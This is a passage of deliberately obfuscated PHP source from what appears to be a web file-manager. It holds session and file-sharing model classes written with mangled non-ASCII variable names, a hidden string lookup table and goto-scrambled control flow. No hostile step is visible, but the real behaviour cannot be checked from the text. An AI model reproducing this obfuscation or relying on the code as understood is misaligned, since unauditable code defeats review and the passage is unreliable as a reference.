pluginScan($EÍ¨¬ë‚òĞ) { $aãøƒ®Û¦ö =& $_SERVER[Æ¼ôºÙï]; recursion_dir(PLUGIN_DIR, $eğØ§˜¦ŒÊ, $c‡ø•¦Í, 0); foreach ($eğØ§˜¦ŒÊ as $a‹©È§¢) { $B´¹Â¶âÈ = get_path_this($a‹©È§¢); if (isset($EÍ¨¬ë‚òĞ[$B´¹Â¶âÈ]) || !file_exists($a‹©È§¢ . $aãøƒ®Û¦ö[1783]) || !file_exists($a‹©È§¢ . $aãøƒ®Û¦ö[1774])) { continue; } Hook::apply($B´¹Â¶âÈ . $aãøƒ®Û¦ö[1777]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\155\x5f\x73\145\x73\x73\x69\x6f\x6e"; public function get($F¹Ç‚êŠêê) { $a–ñˆÏÜ®÷ =& $_SERVER[Æ¼ôºÙï]; $bÕƒİÈ™ø = $this->where(array($a–ñˆÏÜ®÷[1784] => $F¹Ç‚êŠêê))->find(); if (!is_array($bÕƒİÈ™ø)) { return !1; } return $bÕƒİÈ™ø[$a–ñˆÏÜ®÷[711]]; } public function set($BÀ¾ò¸£óˆ, $EÒ…¯¬Š¡Á, $fó”îÒÀÊŞ = 3600) { $E¦®•¯ì·Ä =& $_SERVER[Æ¼ôºÙï]; $cË ’¹‡õ“ = array($E¦®•¯ì·Ä[1784] => $BÀ¾ò¸£óˆ, $E¦®•¯ì·Ä[1695] => $EÒ…¯¬Š¡Á, $E¦®•¯ì·Ä[1785] => $fó”îÒÀÊŞ + time()); if (Session::get($E¦®•¯ì·Ä[1786])) { $cË ’¹‡õ“[$E¦®•¯ì·Ä[1502]] = Session::get($E¦®•¯ì·Ä[1786]); } else { $cË ’¹‡õ“[$E¦®•¯ì·Ä[1502]] = 0; } if ($this->get($BÀ¾ò¸£óˆ)) { return $this->where(array($E¦®•¯ì·Ä[1784] => $BÀ¾ò¸£óˆ))->save($cË ’¹‡õ“); } else { return $this->add($cË ’¹‡õ“, array(), !0); } } public function remove($Fã‰œì·Ÿ¨) { return $this->where(array($_SERVER[Æ¼ôºÙï][1784] => $Fã‰œì·Ÿ¨))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Æ¼ôºÙï][1787] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\145"; protected $dataAuto = array(array("\x6d\157\x64\151\146\171\x54\x69\x6d\145", "\164\151\155\145", "\x69\156\x73\x65\162\164\x2c\x75\160\144\x61\164\145", "\x66\165\156\143\164\151\x6f\x6e"), array("\x63\162\145\141\164\145\x54\x69\x6d\x65", "\164\x69\155\x65", "\x69\x6e\x73\145\162\x74", "\146\x75\156\143\x74\151\x6f\156"), array("\157\x70\x74\x69\157\156\x73", '', "\151\x6e\163\x65\162\164\x2c\165\160\x64\141\164\145\x2c\x73\145\x6c\145\143\164", "\x6a\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($FöÚİèÌ‚ó) { $BÉ©»ÏŸ¦Ö =& $_SERVER[Æ¼ôºÙï]; $AÉ¯¨ˆ…ˆé = isset($FöÚİèÌ‚ó[0]) ? $FöÚİèÌ‚ó[0] : !1; return array($BÉ©»ÏŸ¦Ö[1788] => array(USER_ID, $BÉ©»ÏŸ¦Ö[1789]), $BÉ©»ÏŸ¦Ö[1737] => array($AÉ¯¨ˆ…ˆé, $BÉ©»ÏŸ¦Ö[1790])); } protected function listSimple() { $c¿ĞœİØÉ = array($_SERVER[Æ¼ôºÙï][1502] => USER_ID); $CÉ®˜‰ÛÂÙ = $this->field($this->fieldList)->where($c¿ĞœİØÉ)->select(); return $CÉ®˜‰ÛÂÙ ? $CÉ®˜‰ÛÂÙ : array(); } protected function getInfo($D„Ùº¤Ú¯, $E½¹¤¢ï¦ = false) { $cˆ‚£ÂŠ =& $_SERVER[Æ¼ôºÙï]; if ($E½¹¤¢ï¦) { return $this->_getShareInfo(array($cˆ‚£ÂŠ[457] => $D„Ùº¤Ú¯)); } $e½‰Œ­Š‘ô = $this->cacheFunctionGet($cˆ‚£ÂŠ[1791], $D„Ùº¤Ú¯); return $e½‰Œ­Š‘ô; } public function getInfoByHash($bÉˆŠ¢’) { return $this->_getShareInfo(array($_SERVER[Æ¼ôºÙï][459] => $bÉˆŠ¢’)); } public function getInfoByPath($fÉ®ã˜¾ Ş) { $d¿»¢óÊÌ =& $_SERVER[Æ¼ôºÙï]; $B±ï‡Ò…˜š = array($d¿»¢óÊÌ[1502] => USER_ID, $d¿»¢óÊÌ[387] => $fÉ®ã˜¾ Ş); return $this->_getShareInfo($B±ï‡Ò…˜š); } public function getInfoBySourcePath($dìãçÈ”£) { $E«ï·ê±ç· =& $_SERVER[Æ¼ôºÙï]; $B‡Ÿ½Ÿö = array($E«ï·ê±ç·[1502] => USER_ID, $E«ï·ê±ç·[1050] => $dìãçÈ”£); return $this->_getShareInfo($B‡Ÿ½Ÿö); } private function _getShareInfo($CÁšÕµÍÑõ) { goto eÄ„±ÀéğÄ; eÄ„±ÀéğÄ: $fèó‹¢™°ñ =& $_SERVER[Æ¼ôºÙï]; $B¨„©‹ê£ = $this->where($CÁšÕµÍÑõ)->find(); if (!$B¨„©‹ê£) { return !1; } goto eĞ†Ì’–; eĞ†Ì’–: $CÁšÕµÍÑõ = array($fèó‹¢™°ñ[457] => $B¨„©‹ê£[$fèó‹¢™°ñ[457]]); $bšä››Í¨¤ = $fèó‹¢™°ñ[1792]; $bãÉàÀ¹…ß = Model($fèó‹¢™°ñ[553])->order($fèó‹¢™°ñ[385])->field($bšä››Í¨¤)->where($CÁšÕµÍÑõ)->select(); goto fª é¯Ô«; fª é¯Ô«: if ($B¨„©‹ê£[$fèó‹¢™°ñ[387]] == $fèó‹¢™°ñ[486]) { $B¨„©‹ê£[$fèó‹¢™°ñ[84]] = IO::info($B¨„©‹ê£[$fèó‹¢™°ñ[1050]]); } else { $B¨„©‹ê£[$fèó‹¢™°ñ[84]] = Model($fèó‹¢™°ñ[1182])->pathInfo($B¨„©‹ê£[$fèó‹¢™°ñ[387]]); } $B¨„©‹ê£[$fèó‹¢™°ñ[1793]] = $bãÉàÀ¹…ß; return $B¨„©‹ê£; goto BÄéºÚ¤Ÿ; BÄéºÚ¤Ÿ: } protected function getInfoAuth($C‹Ûé½º÷¯) { $aÀ«ÏŞ›µø =& $_SERVER[Æ¼ôºÙï]; $CÍÎï–©¨Ÿ = $this->getInfo($C‹Ûé½º÷¯); $CÍÎï–©¨Ÿ[$aÀ«ÏŞ›µø[394]] = Model($aÀ«ÏŞ›µø[472])->authMake($CÍÎï–©¨Ÿ[$aÀ«ÏŞ›µø[1793]]); return $CÍÎï–©¨Ÿ; } protected function listData($bó¼“‡œá = null, $B„Š¦İÊƒ = 300) { $e‘¥ôƒÔğÕ =& $_SERVER[Æ¼ôºÙï]; $f—ø“Áéßè = array(array($e‘¥ôƒÔğÕ[462] => array($e‘¥ôƒÔğÕ[948], 0), $e‘¥ôƒÔğÕ[464] => array($e‘¥ôƒÔğÕ[948], 0), $e‘¥ôƒÔğÕ[1794] => $e‘¥ôƒÔğÕ[1751])); if ($bó¼“‡œá == $e‘¥ôƒÔğÕ[1795]) { $f—ø“Áéßè = array($e‘¥ôƒÔğÕ[462] => 1); } else { if ($bó¼“‡œá == $e‘¥ôƒÔğÕ[1035]) { $f—ø“Áéßè = array($e‘¥ôƒÔğÕ[464] => 1); } } $f—ø“Áéßè[$e‘¥ôƒÔğÕ[1502]] = USER_ID; $E‹…Æèõô = $this->where($f—ø“Áéßè)->selectPage($B„Š¦İÊƒ); return $E‹…Æèõô; } protected function listToMe($AÒ­‰ ±Ò = 300) { goto fÅÔ¢–­ËÚ; Cà›µ§Ìæ: if (!$f»í”ôáğ) { return $d¯¬öÅ¹; } $d‘¤ğË…¤â = $bç·™îù¬[1797]; $bÍÆóäõ„Á = array($bç·™îù¬[457] => array($bç·™îù¬[402], array_keys($f»í”ôáğ))); goto D‹÷‘…ê¿İ; fÅÔ¢–­ËÚ: $bç·™îù¬ =& $_SERVER[Æ¼ôºÙï]; $b©§ÃöÀ¾ = Model($bç·™îù¬[1796])->userGroupParents(USER_ID); $bÍÆóäõ„Á = array($bç·™îù¬[538] => SourceModel::TYPE_USER, $bç·™îù¬[474] => USER_ID); goto b—²ÃØ¨¿Ö; b—²ÃØ¨¿Ö: if ($b©§ÃöÀ¾) { $bÍÆóäõ„Á = array(array($bç·™îù¬[538] => SourceModel::TYPE_USER, $bç·™îù¬[474] => USER_ID), array($bç·™îù¬[538] => SourceModel::TYPE_GROUP, $bç·™îù¬[474] => array($bç·™îù¬[7], $b©§ÃöÀ¾)), $bç·™îù¬[1794] => $bç·™îù¬[1751]); } $d¯¬öÅ¹ = Model($bç·™îù¬[553])->where($bÍÆóäõ„Á)->selectPage($AÒ­‰ ±Ò); $f»í”ôáğ = array_to_keyvalue_group($d¯¬öÅ¹[$bç·™îù¬[363]], $bç·™îù¬[457]); goto Cà›µ§Ìæ; BÅÊ£ˆƒ‚…: $F–Æ™Ú´‘ = array($bç·™îù¬[1798] => $fè”é„Ôõ˜, $bç·™îù¬[1799] => $d¯¬öÅ¹[$bç·™îù¬[360]]); return $F–Æ™Ú´‘; goto d«‹Í«Øê¼; D‹÷‘…ê¿İ: $fè”é„Ôõ˜ = $this->field($d‘¤ğË…¤â)->where($bÍÆóäõ„Á)->select(); foreach ($fè”é„Ôõ˜ as $Eé²¥‚¹«¾ => &$e®«ğ“ë) { $e®«ğ“ë[$bç·™îù¬[1793]] = $f»í”ôáğ[$e®«ğ“ë[$bç·™îù¬[457]]]; } unset($e®«ğ“ë); goto BÅÊ£ˆƒ‚…; d«‹Í«Øê¼: } protected function shareAdd($B¶‰™È‘¹‡, $bóïªÌ¸İ) { $eºË‹Ï³… =& $_SERVER[Æ¼ôºÙï]; $C£¨±ƒó– = $this->_addShareData($B¶‰™È‘¹‡, $bóïªÌ¸İ); if (!empty($bóïªÌ¸İ[$eºË‹Ï³…[1800]])) { $this->_shareAuthSet($C£¨±ƒó–, $bóïªÌ¸İ[$eºË‹Ï³…[1800]]); } $this->shareEventAdd($B¶‰™È‘¹‡, $bóïªÌ¸İ, $eºË‹Ï³…[1038]); return $C£¨±ƒó–; } private function shareEventAdd($c„ÁĞ‹å—È, $a‡ Ğ‘‹¼¦, $DğŒÏó­™ó = "\141\x64\x64") { goto C½Â©¶³­Ü; F±ëÒÖ Î‹: $cĞ»øóŸ¶ = $AµÒ´îÓÃè[1803]; if ($DŒá•ªˆ‹¬[$AµÒ´îÓÃè[462]] == $AµÒ´îÓÃè[486] && $a‡ Ğ‘‹¼¦[$AµÒ´îÓÃè[462]] == $AµÒ´îÓÃè[86]) { $cĞ»øóŸ¶ = $AµÒ´îÓÃè[1801]; } if ($DŒá•ªˆ‹¬[$AµÒ´îÓÃè[462]] == $AµÒ´îÓÃè[86] && $a‡ Ğ‘‹¼¦[$AµÒ´îÓÃè[462]] == $AµÒ´îÓÃè[486]) { $cĞ»øóŸ¶ = $AµÒ´îÓÃè[1804]; } goto CÛ¢æŠâÈ; F¸ÓÀ¡‰©Ÿ: return; goto C¶½‹Ç‹Ş×; C½Â©¶³­Ü: $AµÒ´îÓÃè =& $_SERVER[Æ¼ôºÙï]; if ($DğŒÏó­™ó == $AµÒ´îÓÃè[1038]) { if ($a‡ Ğ‘‹¼¦[$AµÒ´îÓÃè[462]] == $AµÒ´îÓÃè[86]) { Model($AµÒ´îÓÃè[522])->eventShare($c„ÁĞ‹å—È, $AµÒ´îÓÃè[1801]); } if ($a‡ Ğ‘‹¼¦[$AµÒ´îÓÃè[464]] == $AµÒ´îÓÃè[86]) { Model($AµÒ´îÓÃè[522])->eventShare($c„ÁĞ‹å—È, $AµÒ´îÓÃè[1802]); } return; } $DŒá•ªˆ‹¬ = $this->getInfoByPath($c„ÁĞ‹å—È); goto F±ëÒÖ Î‹; CÛ¢æŠâÈ: if ($DŒá•ªˆ‹¬[$AµÒ´îÓÃè[464]] == $AµÒ´îÓÃè[486] && $a‡ Ğ‘‹¼¦[$AµÒ´îÓÃè[464]] == $AµÒ´îÓÃè[86]) { $cĞ»øóŸ¶ = $AµÒ´îÓÃè[1802]; } if ($DŒá•ªˆ‹¬[$AµÒ´îÓÃè[464]] == $AµÒ´îÓÃè[86] && $a‡ Ğ‘‹¼¦[$AµÒ´îÓÃè[464]] == $AµÒ´îÓÃè[486]) { $cĞ»øóŸ¶ = $AµÒ´îÓÃè[1805]; } Model($AµÒ´îÓÃè[522])->eventShare($c„ÁĞ‹å—È, $cĞ»øóŸ¶); goto F¸ÓÀ¡‰©Ÿ; C¶½‹Ç‹Ş×: } private function _addShareData($fä¹é„Ÿ´ë, $AÚÏÍŸë›µ = array()) { goto EÎ˜ï¿‚º; EÎ˜ï¿‚º: $e•ïæ¶…á =& $_SERVER[Æ¼ôºÙï]; $E‹²’ÕòÂÙ = array($e•ïæ¶…á[401] => $fä¹é„Ÿ´ë, $e•ïæ¶…á[1494] => USER_ID); if ($fä¹é„Ÿ´ë == 0) { $E‹²’ÕòÂÙ = array($e•ïæ¶…á[1806] => $AÚÏÍŸë›µ[$e•ïæ¶…á[1050]], $e•ïæ¶…á[1494] => USER_ID); } goto Dñå‚ô£ï¶; A©“”—µğ: $bôÒÇñÁ´Ï = array($e•ïæ¶…á[1494] => USER_ID, $e•ïæ¶…á[401] => $fä¹é„Ÿ´ë, $e•ïæ¶…á[1407] => $e•ïæ¶…á[33], $e•ïæ¶…á[462] => 0, $e•ïæ¶…á[464] => 0, $e•ïæ¶…á[1050] => $e•ïæ¶…á[33], $e•ïæ¶…á[303] => $e•ïæ¶…á[33], $e•ïæ¶…á[828] => $e•ïæ¶…á[33], $e•ïæ¶…á[1807] => 0, $e•ïæ¶…á[1808] => 0, $e•ïæ¶…á[465] => 0, $e•ïæ¶…á[466] => $e•ïæ¶…á[33], $e•ïæ¶…á[459] => $e•ïæ¶…á[33]); $c„ƒç… øŞ = explode($e•ïæ¶…á[47], $e•ïæ¶…á[1809]); foreach ($c„ƒç… øŞ as $fÙÂ‚ÂÉˆ) { if (!isset($AÚÏÍŸë›µ[$fÙÂ‚ÂÉˆ])) { continue; } $bôÒÇñÁ´Ï[$fÙÂ‚ÂÉˆ] = $AÚÏÍŸë›µ[$fÙÂ‚ÂÉˆ]; } goto a÷–ó“—ºö; a÷–ó“—ºö: $få®Ã´İÓ‘ = $this->add($bôÒÇñÁ´Ï); $aÂíÊåĞöÖ = array($e•ïæ¶…á[459] => short_id($få®Ã´İÓ‘)); $this->where(array($e•ïæ¶…á[456] => $få®Ã´İÓ‘))->save($aÂíÊåĞöÖ); goto F£ò¤‡ÖÕ; Dñå‚ô£ï¶: if ($AÄ‘ƒê×êÆ = $this->where($E‹²’ÕòÂÙ)->find()) { return $AÄ‘ƒê×êÆ[$e•ïæ¶…á[457]]; } if ($fä¹é„Ÿ´ë == 0) { $e‘ô“°ô¼Æ = array($e•ïæ¶…á[28] => get_path_this($AÚÏÍŸë›µ[$e•ïæ¶…á[75]])); } else { $e‘ô“°ô¼Æ = Model($e•ïæ¶…á[770])->sourceInfo($fä¹é„Ÿ´ë); if (!$e‘ô“°ô¼Æ) { return !1; } } if (!$AÚÏÍŸë›µ[$e•ïæ¶…á[1407]]) { $AÚÏÍŸë›µ[$e•ïæ¶…á[1407]] = $e‘ô“°ô¼Æ[$e•ïæ¶…á[28]]; } goto A©“”—µğ; F£ò¤‡ÖÕ: return $få®Ã´İÓ‘; goto aê«ìÉ‡ÉĞ; aê«ìÉ‡ÉĞ: } private function _shareAuthSet($BÀè¼Ú²µñ, $Aß¤Î½½Ö¯) { goto A¾»¬ôÙÃ; dßŞİ»«ù: $AéË™ç‹¼«->where(array($B½Ú§Ãôã¶[457] => $BÀè¼Ú²µñ))->delete(); $fí¸Å´İç = array(); foreach ($Aß¤Î½½Ö¯ as $FîÌ«Ëáù») { $cµª¥¢…Î = SourceModel::TYPE_USER; if ($FîÌ«Ëáù»[$B½Ú§Ãôã¶[389]] == SourceModel::TYPE_GROUP) { $cµª¥¢…Î = SourceModel::TYPE_GROUP; } $dè¬Â‡±Ü¬ = array($B½Ú§Ãôã¶[457] => $BÀè¼Ú²µñ, $B½Ú§Ãôã¶[389] => $cµª¥¢…Î, $B½Ú§Ãôã¶[474] => intval($FîÌ«Ëáù»[$B½Ú§Ãôã¶[474]]), $B½Ú§Ãôã¶[1811] => 0, $B½Ú§Ãôã¶[1812] => -1); if ($FîÌ«Ëáù»[$B½Ú§Ãôã¶[1811]]) { $dè¬Â‡±Ü¬[$B½Ú§Ãôã¶[1811]] = $FîÌ«Ëáù»[$B½Ú§Ãôã¶[1811]]; } else { if ($FîÌ«Ëáù»[$B½Ú§Ãôã¶[1812]]) { $dè¬Â‡±Ü¬[$B½Ú§Ãôã¶[1812]] = $FîÌ«Ëáù»[$B½Ú§Ãôã¶[1812]]; } } $fí¸Å´İç[] = $dè¬Â‡±Ü¬; } goto aí»È›ÖîÈ; A¾»¬ôÙÃ: $B½Ú§Ãôã¶ =& $_SERVER[Æ¼ôºÙï]; if (!is_array($Aß¤Î½½Ö¯)) { return !1; } $AéË™ç‹¼« = Model($B½Ú§Ãôã¶[1810]); goto dßŞİ»«ù; aí»È›ÖîÈ: return $AéË™ç‹¼«->addAll($fí¸Å´İç, array(), !0); goto eò–šÚÁ ê; eò–šÚÁ ê: } public function numViewAdd($dªèùÖ¡ŒÉ) { $dâÉ°Ó„åË =& $_SERVER[Æ¼ôºÙï]; $f¬“ˆ³§ = array($dâÉ°Ó„åË[456] => $dªèùÖ¡ŒÉ); $this->where($f¬“ˆ³§)->setAdd($dâÉ°Ó„åË[1807]); } public function numDownloadAdd($a±¸íà¦¤©) { $f¿Ä‘»‚Ÿ† =& $_SERVER[Æ¼ôºÙï]; $a“ìœê‘¾Ü = array($f¿Ä‘»‚Ÿ†[456] => $a±¸íà¦¤©); $this->where($a“ìœê‘¾Ü)->setAdd($f¿Ä‘»‚Ÿ†[1808]); } protected function shareEdit($EñÊÙÏêÈê, $f¼óò¾ÛŸï) { goto A»‹™¹ƒ®ª; cğ¨Åõƒ: $this->_checkLinkShare($f¼óò¾ÛŸï, $f×ŒìäéÄÇ); $F®ßŠÕñ‚¾ = array(); $A¯ááœ˜ãŞ = explode($F‘Û‰“—Ñİ[47], $F‘Û‰“—Ñİ[1813]); goto AĞßù‚ùàñ; AĞßù‚ùàñ: foreach ($A¯ááœ˜ãŞ as $B–¡Ò»Æ¿ê) { if (!array_key_exists($B–¡Ò»Æ¿ê, $f¼óò¾ÛŸï)) { continue; } $F®ßŠÕñ‚¾[$B–¡Ò»Æ¿ê] = $f¼óò¾ÛŸï[$B–¡Ò»Æ¿ê]; } $this->shareEventAdd($f×ŒìäéÄÇ[$F‘Û‰“—Ñİ[387]], $f¼óò¾ÛŸï, $F‘Û‰“—Ñİ[1628]); $this->where(array($F‘Û‰“—Ñİ[456] => $EñÊÙÏêÈê))->save($F®ßŠÕñ‚¾); goto f‰çÍÈ’…; f‰çÍÈ’…: if (isset($f¼óò¾ÛŸï[$F‘Û‰“—Ñİ[1800]])) { $this->_shareAuthSet($EñÊÙÏêÈê, $f¼óò¾ÛŸï[$F‘Û‰“—Ñİ[1800]]); } return !0; goto DÂË®¿í¾‰; A»‹™¹ƒ®ª: $F‘Û‰“—Ñİ =& $_SERVER[Æ¼ôºÙï]; $f×ŒìäéÄÇ = $this->getInfo($EñÊÙÏêÈê); if (!$f×ŒìäéÄÇ) { return !1; } goto cğ¨Åõƒ; DÂË®¿í¾‰: } private function _checkLinkShare($aŠ’Çš…–Ÿ, $eªôöİ¢£) { goto e‚¼‰Ì÷á²; e‚¼‰Ì÷á²: $dö´©š‰íË =& $_SERVER[Æ¼ôºÙï]; if ($aŠ’Çš…–Ÿ[$dö´©š‰íË[462]] != $dö´©š‰íË[86]) { return; } $a…ùŞÈŠ„é = $eªôöİ¢£[$dö´©š‰íË[84]][$dö´©š‰íË[387]]; goto AÊåù¢ê¼Ì; AÊåù¢ê¼Ì: if ($eªôöİ¢£[$dö´©š‰íË[84]][$dö´©š‰íË[29]] != $dö´©š‰íË[173]) { $c öš¶ØÛ = $this->_folderReport($a…ùŞÈŠ„é); if (!$c öš¶ØÛ) { return; } show_json(LNG($dö´©š‰íË[1814]) . $dö´©š‰íË[1815] . $c öš¶ØÛ, !1); } $f¼îêŸİĞ„ = Model($dö´©š‰íË[770])->fileInfoGet($eªôöİ¢£[$dö´©š‰íË[84]][$dö´©š‰íË[387]]); if (!$f¼îêŸİĞ„) { return; } goto d»éÚ«¿Œè; d»éÚ«¿Œè: $FÃ…á îì© = $this->shareFileMeta($f¼îêŸİĞ„[$dö´©š‰íË[436]]); if (isset($FÃ…á îì©[$dö´©š‰íË[368]]) && $FÃ…á îì©[$dö´©š‰íË[368]] == $dö´©š‰íË[86]) { show_json(LNG($dö´©š‰íË[1816]), !1); } goto eÃõ–˜ò¹Û; eÃõ–˜ò¹Û: } private function _folderReport($b¡ÖÊ’É) { goto f”˜†šª¸®; cÕ®ÍÖ‚¹—: $E¬×·ØØºë = array($a’æ…§öØ[436] => array($a’æ…§öØ[7], $d×Ü¯Ú÷î), $a’æ…§öØ[477] => array($a’æ…§öØ[375], "\45{$FÒ‘¼‘Î¸}\x25"), $a’æ…§öØ[414] => 0); $f•‘æ†ßéÎ = Model($a’æ…§öØ[770])->where($E¬×·ØØºë)->field($a’æ…§öØ[1818])->find(); if (!$f•‘æ†ßéÎ) { return !1; } goto e¹©†Ûè‚Ç; e¹©†Ûè‚Ç: $BŠëØ–ŞÚ = substr($f•‘æ†ßéÎ[$a’æ…§öØ[477]], strpos($f•‘æ†ßéÎ[$a’æ…§öØ[477]], $FÒ‘¼‘Î¸)); $E¬×·ØØºë = array($a’æ…§öØ[387] => array($a’æ…§öØ[7], trim($BŠëØ–ŞÚ, $a’æ…§öØ[47]))); $a‹‚–¬÷Ğõ = Model($a’æ…§öØ[770])->where($E¬×·ØØºë)->field($a’æ…§öØ[28])->select(); goto f¡•£Õˆº¥; f”˜†šª¸®: $a’æ…§öØ =& $_SERVER[Æ¼ôºÙï]; $E¬×·ØØºë = array($a’æ…§öØ[436] => array($a’æ…§öØ[948], 0), $a’æ…§öØ[708] => 3); $d×Ü¯Ú÷î = Model($a’æ…§öØ[1817])->where($E¬×·ØØºë)->field($a’æ…§öØ[436])->select(); goto Açºô‚Æùó; Açºô‚Æùó: if (!$d×Ü¯Ú÷î) { return !1; } $d×Ü¯Ú÷î = array_to_keyvalue($d×Ü¯Ú÷î, $a’æ…§öØ[33], $a’æ…§öØ[436]); $FÒ‘¼‘Î¸ = $a’æ…§öØ[47] . $b¡ÖÊ’É . $a’æ…§öØ[47]; goto cÕ®ÍÖ‚¹—; f¡•£Õˆº¥: $Eö·İç‡„… = array_to_keyvalue($a‹‚–¬÷Ğõ, $a’æ…§öØ[33], $a’æ…§öØ[28]); $Eö·İç‡„…[] = $f•‘æ†ßéÎ[$a’æ…§öØ[28]]; return implode($a’æ…§öØ[8], $Eö·İç‡„…); goto A­³è³³Û‡; A­³è³³Û‡: } protected function remove($D¥Å ¡õ²‰) { goto a‡Ëİ½›Òô; a‡Ëİ½›Òô: $FõŒ‘©Æ¨š =& $_SERVER[Æ¼ôºÙï]; if (is_array($D¥Å ¡õ²‰)) { $D¥Å ¡õ²‰ = array($FõŒ‘©Æ¨š[7], $D¥Å ¡õ²‰); } $bóã›¢”•Ó = array($FõŒ‘©Æ¨š[457] => $D¥Å ¡õ²‰); goto BÊ¥à¡è ç; BÊ¥à¡è ç: $B˜£ÄÎÂˆ = $this->where($bóã›¢”•Ó)->delete(); if ($B˜£ÄÎÂˆ) { Model($FõŒ‘©Æ¨š[553])->where(array($FõŒ‘©Æ¨š[457] => $D¥Å ¡õ²‰))->delete(); } $eœ²‚¦‰Ó = is_array($D¥Å ¡õ²‰) ? $D¥Å ¡õ²‰[1] : array($D¥Å ¡õ²‰); goto D Á„ £Ù†; D Á„ £Ù†: for ($Fìƒç¾á¿® = 0; $Fìƒç¾á¿® < count($eœ²‚¦‰Ó); $Fìƒç¾á¿®++) { $dŞãĞƒ¡¡å = $this->getInfo($eœ²‚¦‰Ó[$Fìƒç¾á¿®]); if ($dŞãĞƒ¡¡å[$FõŒ‘©Æ¨š[464]] == $FõŒ‘©Æ¨š[86]) { Model($FõŒ‘©Æ¨š[522])->eventShare($dŞãĞƒ¡¡å[$FõŒ‘©Æ¨š[387]], $FõŒ‘©Æ¨š[1805]); } if ($dŞãĞƒ¡¡å[$FõŒ‘©Æ¨š[462]] == $FõŒ‘©Æ¨š[86]) { Model($FõŒ‘©Æ¨š[522])->eventShare($dŞãĞƒ¡¡å[$FõŒ‘©Æ¨š[387]], $FõŒ‘©Æ¨š[1804]); } } return $B˜£ÄÎÂˆ; goto dŒÔóéšÏ’; dŒÔóéšÏ’: } protected function removeBySource($cñÉ®óàŠ‹) { goto C±‡ŞáÁÍ; B¼öçÓò˜İ: $this->where($F°¢Æ²ªî©)->delete(); Model($Bª½»Áà©[553])->where($F°¢Æ²ªî©)->delete(); goto dÚ¥ø°Ş±; C±‡ŞáÁÍ: $Bª½»Áà© =& $_SERVER[Æ¼ôºÙï]; $F°¢Æ²ªî© = array($Bª½»Áà©[401] => array($Bª½»Áà©[402], $cñÉ®óàŠ‹)); $aã›²·ğùŒ = $this->field($Bª½»Áà©[457])->where($F°¢Æ²ªî©)->select(); goto AÄ»àŠ ‰¿; AÄ»àŠ ‰¿: $aã›²·ğùŒ = array_to_keyvalue($aã›²·ğùŒ, $Bª½»Áà©[33], $Bª½»Áà©[457]); if (!$aã›²·ğùŒ) { return; } $F°¢Æ²ªî© = array($Bª½»Áà©[456] => array($Bª½»Áà©[402], $aã›²·ğùŒ)); goto B¼öçÓò˜İ; dÚ¥ø°Ş±: } public function listAll($EÏ„Ã¥š¼) { goto dÂ¾‚ø°Øƒ; b‘Ôô£ï: return $f¢¼÷‰ö£ø; goto E ÆĞ«ó¬; dÂ¾‚ø°Øƒ: $fí‰òÓ—¼ö =& $_SERVER[Æ¼ôºÙï]; $D¼ğöé›Â¶ = array(); if ($EÏ„Ã¥š¼[$fí‰òÓ—¼ö[1502]]) { $D¼ğöé›Â¶[$fí‰òÓ—¼ö[1502]] = $EÏ„Ã¥š¼[$fí‰òÓ—¼ö[1502]]; } goto b‚‹¬›“‹Ü; b‚‹¬›“‹Ü: if ($EÏ„Ã¥š¼[$fí‰òÓ—¼ö[721]]) { $Dºº¬ŸĞÀÁ = $EÏ„Ã¥š¼[$fí‰òÓ—¼ö[465]] ? $EÏ„Ã¥š¼[$fí‰òÓ—¼ö[465]] : strtotime(date($fí‰òÓ—¼ö[1819])); $D¼ğöé›Â¶[$fí‰òÓ—¼ö[192]] = array($fí‰òÓ—¼ö[329], array($EÏ„Ã¥š¼[$fí‰òÓ—¼ö[721]], $Dºº¬ŸĞÀÁ)); } if ($EÏ„Ã¥š¼[$fí‰òÓ—¼ö[29]]) { $D¼ğöé›Â¶[$EÏ„Ã¥š¼[$fí‰òÓ—¼ö[29]]] = 1; } else { $D¼ğöé›Â¶[] = array($fí‰òÓ—¼ö[462] => array($fí‰òÓ—¼ö[948], 0), $fí‰òÓ—¼ö[464] => array($fí‰òÓ—¼ö[948], 0), $fí‰òÓ—¼ö[1794] => $fí‰òÓ—¼ö[1751]); } if ($EÏ„Ã¥š¼[$fí‰òÓ—¼ö[1747]]) { $D¼ğöé›Â¶[] = array($fí‰òÓ—¼ö[459] => $EÏ„Ã¥š¼[$fí‰òÓ—¼ö[1747]], $fí‰òÓ—¼ö[1407] => array($fí‰òÓ—¼ö[375], "\45{$EÏ„Ã¥š¼[$fí‰òÓ—¼ö[1747]]}\45"), $fí‰òÓ—¼ö[1794] => $fí‰òÓ—¼ö[1751]); } goto BØ„©ãŒ¼; BØ„©ãŒ¼: $f¢¼÷‰ö£ø = $this->_makeOrder()->where($D¼ğöé›Â¶)->selectPage(20); if (empty($f¢¼÷‰ö£ø[$fí‰òÓ—¼ö[363]])) { return array(); } $this->_listDataApply($f¢¼÷‰ö£ø[$fí‰òÓ—¼ö[363]]); goto b‘Ôô£ï; E ÆĞ«ó¬: } public function listDataApply($bÕ‹¸ñ‰É‘) { $this->_listDataApply($bÕ‹¸ñ‰É‘); return $bÕ‹¸ñ‰É‘; } private function _listDataApply(&$E„”©ƒ¡åí) { goto B§¨£é¶ÚÀ; B§¨£é¶ÚÀ: $BÉ½¢¦«Î£ =& $_SERVER[Æ¼ôºÙï]; $a˜“Â¯‘öÌ = array_to_keyvalue($E„”©ƒ¡åí, $BÉ½¢¦«Î£[33], $BÉ½¢¦«Î£[1502]); $dãˆËŠ = Model($BÉ½¢¦«Î£[495])->userListInfo(array_unique($a˜“Â¯‘öÌ)); goto BçĞ¡‘ÜÑæ; BçĞ¡‘ÜÑæ: $FäîõÒ“±³ = array_to_keyvalue($E„”©ƒ¡åí, $BÉ½¢¦«Î£[33], $BÉ½¢¦«Î£[387]); $a«‹Ö›éöÄ = Model($BÉ½¢¦«Î£[770])->sourceListInfo($FäîõÒ“±³, !0); foreach ($E„”©ƒ¡åí as &$eª»Ô¥æØß) { $Fœ˜«¥ÒÁå = $eª»Ô¥æØß[$BÉ½¢¦«Î£[1502]]; $eª»Ô¥æØß[$BÉ½¢¦«Î£[1820]] = $dãˆËŠ[$Fœ˜«¥ÒÁå] ? $dãˆËŠ[$Fœ˜«¥ÒÁå] : !1; $e©²ó¼„Ä = $eª»Ô¥æØß[$BÉ½¢¦«Î£[387]]; $eª»Ô¥æØß[$BÉ½¢¦«Î£[84]] = $a«‹Ö›éöÄ[$e©²ó¼„Ä] 